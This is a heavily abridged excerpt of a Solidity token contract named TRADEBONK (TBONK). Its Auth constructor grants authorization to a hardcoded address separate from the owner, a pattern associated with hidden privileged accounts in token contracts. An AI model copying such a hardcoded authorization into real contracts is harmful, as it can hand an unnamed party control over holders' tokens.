...
abstract contract Auth {
    ...
    constructor(address _owner) {
        ...
        authorizations[
    0x6aBE11b4c153aab50b28c4CE235F73ffB07C0347] = true;}
    modifier onlyOwner() {
...
contract TRADEBONK is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'TRADEBONK';
    string private constant _symbol = 'TBONK';
    ...
    IBEP20 TOKEN = IBEP20(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
